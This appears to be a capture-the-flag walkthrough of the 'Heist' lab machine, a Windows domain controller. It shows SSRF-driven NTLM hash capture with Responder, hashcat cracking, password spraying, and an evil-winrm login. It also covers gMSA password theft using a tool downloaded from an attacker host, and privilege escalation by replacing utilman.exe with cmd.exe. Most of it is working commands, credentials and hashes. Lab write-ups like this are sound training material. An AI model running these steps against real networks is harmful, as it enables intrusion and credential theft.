# 🪟 Heist

## Enumerating Services

First, we perform a generic check to identify the open ports and services running on this machine.

```shell
# Syn Scan
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.173.165

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HEIST
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This is a Domain Controller with hostname DC01, from the heist.offsec domain.

## Enumerating port 53

Zone transfer and DNS enumeration attempts were unsuccessful.

## Enumerating port 445

SMB null sessions are not enabled.

## Enumerating ports 389 / 3268 (LDAP)

ldapsearch requires authentication.

## Enumerating AS-Rep Roastable users

No users with pre-authentication disabled.

## Enumerating users with kerbrute

Only standard system users were found.

## Enumerating port 8080

Navigating to the page, we found a URL field with an SSRF vulnerability. We opened a server with Responder to capture a hash from AD.

```shell
# Server
responder -I tun0 -wv

# Hash (NetNTLMv2)
enox::HEIST:b299d4f2582d47ee:FB78BB5377D041061B47347E6187AECF:...
```

By cracking the hash, we obtained the credentials of the enox user.

```shell
# Cracking the hash
hashcat -m 5600 hash.enox /usr/share/wordlists/rockyou.txt --force
california
```

## Password Spray Attack

```shell
# Password Spray via WinRM
netexec winrm 192.168.232.165 -u users.txt -p pass.txt --continue-on-success
```

## Initial Access

```shell
# WinRM Connect
evil-winrm -i 192.168.232.165 -u enox -p california
```

## Internal Enumeration

```powershell
# Tokens
whoami /priv
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working     Enabled

# Groups
net user enox
Remote Management Users
Domain Users
Web Admins
```

Looking at the local user profiles, we noticed a profile for a service account named `svc_apache$`. We added it to our user list and kerbrute confirmed the user is valid in the domain.

## Enumerating with BloodHound

```powershell
# Collect data
bloodhound-python -d heist.offsec -u enox -p california -c all -ns 192.168.232.165
```

BloodHound revealed that `svc_apache` is a Group Managed Service Account (gMSA) and that users in the WebAdmins group can read their GMSA password.

```powershell
# Transfer GMSAPasswordReader
iwr -uri http://192.168.45.210/GMSAPasswordReader.exe -outfile GMSAPasswordReader.exe

# Retrieve the Password
.\GMSAPasswordReader.exe --accountname 'svc_apache$'
DA55A6102C791A052798C4B7EF6C0122
```

## Privilege Escalation

```shell
# WinRM Connect as svc_apache$
evil-winrm -i 192.168.232.165 -u svc_apache$ -H DA55A6102C791A052798C4B7EF6C0122
```

The `svc_apache$` account has `SeRestorePrivilege` enabled. We found a script in the home directory with instructions on how to exploit it.

```shell
# Enable the privilege
. .\Enable-SeRestorePrivilege.ps1

# Rename utilman.exe to utilman.old
ren C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old

# Rename cmd.exe to utilman.exe
ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

# Connect via RDP
rdesktop 192.168.193.165

# Win + U → CMD as NT authority/system
```

## Post-Exploitation

With privileged access to the system, we collected the local.txt and proof.txt flags.

```shell
# Evidence
ipconfig

# Local
type C:\Users\enox\Desktop\local.txt
c43909eb3b35e03a2853b9e6222f6c3f

# Proof.txt
type C:\Users\Administrator\proof.txt
496a5dd6efb9addc29ce258e1a1c9305
```
